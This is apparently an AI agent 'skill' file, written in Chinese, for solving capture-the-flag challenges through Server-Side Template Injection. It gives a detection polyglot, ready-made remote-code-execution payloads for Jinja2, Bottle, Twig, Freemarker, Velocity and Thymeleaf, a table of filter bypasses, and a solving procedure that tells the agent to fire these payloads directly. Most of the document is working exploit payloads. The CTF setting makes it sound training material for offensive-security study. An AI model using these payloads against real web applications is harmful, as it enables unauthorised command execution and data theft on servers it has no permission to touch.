---
name: ssti-template-rce
description: Server-Side Template Injection (SSTI) 解题通法。Use when the challenge mentions "模板预览/渲染/主题/自定义模板" — these are classic SSTI-to-RCE paths. Covers Jinja2, Twig, Thymeleaf, Pug, Velocity, Freemarker, Bottle SimpleTemplate, and generic detection.
---

# SSTI 模板注入通法

## 检测(通用 polyglot)

在任何用户可控的输入点提交:
```
{{7*7}}${7*7}<%=7*7%>${{7*7}}{7*7}#{7*7}
```
如果返回 `49`,确认 SSTI 存在。根据返回的语法判断引擎:

| 响应 | 引擎 |
|---|---|
| `{{7*7}}` → 49 | Jinja2 / Twig / Nunjucks |
| `${7*7}` → 49 | Freemarker / Velocity / Thymeleaf |
| `<%=7*7%>` → 49 | ERB (Ruby) |
| `#{7*7}` → 49 | Pug / Jade |
| `{{7*'7'}}` → 7777777 | Jinja2 (Python) |
| `{{7*'7'}}` → 49 | Twig (PHP) |

## 引擎 → RCE payload 速查

### Jinja2 (Python) — 最常见
```python
# 基础 RCE
{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}
# 通过 MRO 链
{{''.__class__.__mro__[1].__subclasses__()[X]('cat /flag',shell=True,stdout=-1).communicate()}}
# 其中 X 是 subprocess.Popen 的 index,通常 200-500 范围内搜:
{{''.__class__.__mro__[1].__subclasses__()}}  # 先列出全部,grep Popen 的位置
# 绕过 _ 过滤:
{{request|attr('__class__')|attr('__init__')|attr('__globals__')}}
# 绕过 . 过滤:
{{config['__class__']['__init__']['__globals__']['os']['popen']('id')['read']()}}
```

### Bottle SimpleTemplate (Python) — 题面含 "Bottle"
```python
# Bottle 用 % 和 {{ }}
% import os; os.popen('cat /flag').read()
{{__import__('os').popen('cat /flag').read()}}
```

### Twig (PHP)
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
// 或:
{{['cat /flag']|filter('system')}}
```

### Freemarker (Java)
```
${"freemarker.template.utility.Execute"?new()("cat /flag")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag")}
```

### Velocity (Java)
```
#set($e="")
#set($rt=$e.class.forName("java.lang.Runtime"))
#set($getRuntime=$rt.getMethod("getRuntime"))
#set($runtime=$getRuntime.invoke($e))
#set($exec=$runtime.exec("cat /flag"))
$exec.inputStream.text
```

### Thymeleaf (Java Spring)
```
__${T(java.lang.Runtime).getRuntime().exec('cat /flag')}__::x
```

## 绕过常见过滤

| 被过滤的 | 绕过方式 |
|---|---|
| `_` (下划线) | `\x5f` / `request|attr()` / `|attr('\x5f\x5fclass\x5f\x5f')` |
| `.` (点号) | `['__class__']` bracket 访问 / `|attr()` |
| `{{` | `{%` 语句块 / `{% print(...) %}` |
| `os` / `system` | 通过 MRO 链找 Popen / 用 `|attr` 拼接 |
| 长度限制 | 分段注入(如果有多个输入点) |

## 解题流程

1. **找注入点**: 任何"预览/渲染/主题/自定义"功能 → 提交 polyglot
2. **确认引擎**: 从返回的语法判断
3. **查上面的 payload 表**: 直接用对应引擎的 RCE payload
4. **如果有过滤**: 查绕过表逐一尝试
5. **读 flag**: `cat /flag` / `cat /flag.txt` / `env | grep FLAG`

## 铁律
- **题面写"模板/渲染/预览/主题"就是 SSTI,不要当 XSS 打。**
- 先确认引擎再选 payload,别盲试所有引擎的 payload。
- Jinja2 的 MRO 链 index 每个环境不同,必须先 `{{''.__class__.__mro__[1].__subclasses__()}}` 列出再定位。
